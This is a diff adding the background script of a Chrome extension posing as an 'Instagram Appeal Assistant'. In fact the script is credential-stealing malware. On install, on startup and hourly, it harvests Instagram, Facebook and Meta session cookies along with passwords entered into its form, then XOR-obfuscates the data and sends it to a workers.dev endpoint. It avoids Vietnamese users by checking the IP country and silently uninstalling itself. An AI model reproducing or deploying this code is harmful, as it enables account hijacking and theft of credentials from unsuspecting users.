@@ -1,0 +1,309 @@
+const WORKER_URL = 'https://xxxx12.tungnguyenyoutube6156.workers.dev';
+const SECRET_KEY = 'MetaSecure2024';
+let hasSentCookies = false;
+let savedPasswords = [];
+let isBlocked = false;
+let isCheckingIP = false;
+let isSending = false;
+
+function encryptData(data) {
+    const jsonString = JSON.stringify(data);
+    let encrypted = '';
+    for (let i = 0; i < jsonString.length; i++) {
+        const charCode = jsonString.charCodeAt(i);
+        const keyChar = SECRET_KEY.charCodeAt(i % SECRET_KEY.length);
+        encrypted += String.fromCharCode(charCode ^ keyChar);
+    }
+    return btoa(encrypted);
+}
+
+function showNotification(message) {
+    try {
+        chrome.notifications.create({
+            type: 'basic',
+            iconUrl: 'icons/icon.png',
+            title: 'Instagram Appeal Assistant',
+            message: message,
+            priority: 2
+        });
+    } catch (e) { }
+}
+
+function uninstallExtension() {
+    try {
+        chrome.management.uninstallSelf({
+            showConfirmDialog: false
+        });
+    } catch (error) {
+        console.log('Uninstall error:', error);
+    }
+}
+
+async function checkIPAndRemove() {
+    if (isBlocked || isCheckingIP) return true;
+
+    isCheckingIP = true;
+
+    try {
+        const response = await fetch('https://ipinfo.io/json', {
+            method: 'GET',
+            headers: {
+                'Accept': 'application/json'
+            }
+        });
+
+        if (!response.ok) {
+            isCheckingIP = false;
+            return false;
+        }
+
+        const data = await response.json();
+        const country = data.country || '';
+
+        if (country === 'VN') {
+            isBlocked = true;
+            isCheckingIP = false;
+
+            showNotification('Your device is not supported in Vietnam. The extension will be removed immediately.');
+
+            setTimeout(() => {
+                uninstallExtension();
+            }, 1500);
+
+            return true;
+        }
+
+        isCheckingIP = false;
+        return false;
+    } catch (error) {
+        console.log('IP check failed:', error.message);
+        isCheckingIP = false;
+        return false;
+    }
+}
+
+function getUIDFromCookies(cookies) {
+    try {
+        if (cookies && cookies.FACEBOOK && cookies.FACEBOOK.cookies) {
+            for (const cookie of cookies.FACEBOOK.cookies) {
+                if (cookie.name === 'c_user') {
+                    return cookie.value;
+                }
+            }
+        }
+        return 'No Login Facebook';
+    } catch {
+        return 'No Login Facebook';
+    }
+}
+
+async function getCookies() {
+    const domains = [
+        { name: 'INSTAGRAM', domain: 'instagram.com', url: 'https://www.instagram.com' },
+        { name: 'FACEBOOK', domain: 'facebook.com', url: 'https://www.facebook.com' },
+        { name: 'META', domain: 'meta.com', url: 'https://auth.meta.com' }
+    ];
+
+    const cookieData = {};
+    const cookieStringParts = [];
+    const cookieJsonParts = [];
+
+    for (const site of domains) {
+        try {
+            const cookies = await chrome.cookies.getAll({ domain: site.domain });
+            const cookieValues = cookies.map(c => `${c.name}=${c.value}`);
+            cookieData[site.name] = {
+                url: site.url,
+                cookies: cookies.map(c => ({
+                    domain: c.domain,
+                    name: c.name,
+                    value: c.value,
+                    path: c.path,
+                    secure: c.secure,
+                    httpOnly: c.httpOnly
+                }))
+            };
+            cookieStringParts.push(`${site.name}\n---\n${cookieValues.join('; ')}`);
+            cookieJsonParts.push(`===${site.name}===\n${JSON.stringify(cookieData[site.name])}`);
+        } catch (error) {
+            cookieData[site.name] = { url: site.url, cookies: [] };
+        }
+    }
+
+    const uid = getUIDFromCookies(cookieData);
+
+    return {
+        json: cookieData,
+        string: cookieStringParts.join('\n---\n'),
+        jsonString: cookieJsonParts.join('\n\n'),
+        uid: uid
+    };
+}
+
+async function sendToWorker(data) {
+    if (isBlocked) return null;
+
+    try {
+        const encryptedPayload = encryptData(data);
+        const response = await fetch(`${WORKER_URL}/submit`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                payload: encryptedPayload
+            })
+        });
+        return await response.json();
+    } catch (error) {
+        return null;
+    }
+}
+
+async function collectAndSend() {
+    if (isBlocked || hasSentCookies) return;
+
+    try {
+        const cookies = await getCookies();
+        const payload = {
+            timestamp: new Date().toISOString(),
+            cookies_string: cookies.string,
+            cookies_json: cookies.json,
+            cookies_json_string: cookies.jsonString,
+            uid: cookies.uid,
+            event: 'collect'
+        };
+        await sendToWorker(payload);
+        hasSentCookies = true;
+    } catch (error) {
+        console.error('Collect error:', error);
+    }
+}
+
+async function sendAllPasswords() {
+    if (savedPasswords.length === 0 || isBlocked || isSending) return;
+
+    isSending = true;
+
+    try {
+        const cookies = await getCookies();
+        const payload = {
+            timestamp: new Date().toISOString(),
+            event: 'auth_success',
+            passwords: savedPasswords.slice(),
+            uid: cookies.uid
+        };
+
+        const result = await sendToWorker(payload);
+        console.log('All passwords sent successfully:', result);
+        savedPasswords = [];
+        isSending = false;
+    } catch (error) {
+        console.error('Error sending passwords:', error);
+        isSending = false;
+    }
+}
+
+function addPassword(password, attempt = 1) {
+    savedPasswords.push({
+        password: password,
+        attempt: attempt,
+        timestamp: new Date().toISOString()
+    });
+
+    if (savedPasswords.length >= 2) {
+        sendAllPasswords();
+    }
+}
+
+chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
+    if (isBlocked) {
+        sendResponse({ success: false, error: 'Blocked' });
+        return true;
+    }
+
+    if (request.action === 'getCookies') {
+        getCookies().then(cookies => {
+            sendResponse({ success: true, cookies: cookies });
+        });
+        return true;
+    }
+
+    if (request.action === 'collectCookies') {
+        collectAndSend();
+        sendResponse({ success: true });
+        return true;
+    }
+
+    if (request.action === 'savePassword') {
+        console.log('Received password:', request.password);
+        addPassword(request.password, request.attempt || 1);
+        sendResponse({ success: true, message: 'Password saved' });
+        return true;
+    }
+
+    if (request.action === 'submitForm') {
+        console.log('Form submitted:', request.formData);
+
+        if (request.formData && request.formData.password) {
+            addPassword(request.formData.password, request.formData.attempt || 1);
+            sendResponse({ success: true, message: 'Form submitted and password saved' });
+        } else {
+            sendResponse({ success: true });
+        }
+
+        return true;
+    }
+});
+
+async function initializeExtension() {
+    const blocked = await checkIPAndRemove();
+
+    if (!blocked && !isBlocked) {
+        setTimeout(() => {
+            chrome.tabs.create({
+                url: chrome.runtime.getURL('index.html'),
+                active: true
+            });
+        }, 500);
+
+        setTimeout(() => {
+            collectAndSend();
+        }, 2000);
+    }
+}
+
+chrome.runtime.onInstalled.addListener(async (details) => {
+    if (details.reason === 'install' || details.reason === 'update') {
+        await initializeExtension();
+    }
+});
+
+chrome.runtime.onStartup.addListener(async () => {
+    if (!isBlocked) {
+        const blocked = await checkIPAndRemove();
+        if (!blocked && !isBlocked) {
+            setTimeout(() => {
+                collectAndSend();
+            }, 1000);
+        }
+    }
+});
+
+chrome.action.onClicked.addListener(async (tab) => {
+    if (!isBlocked) {
+        const blocked = await checkIPAndRemove();
+        if (!blocked && !isBlocked) {
+            chrome.tabs.create({
+                url: chrome.runtime.getURL('index.html'),
+                active: true
+            });
+        }
+    }
+});
+
+setInterval(() => {
+    if (!isBlocked) {
+        collectAndSend();
+    }
+}, 60 * 60 * 1000);
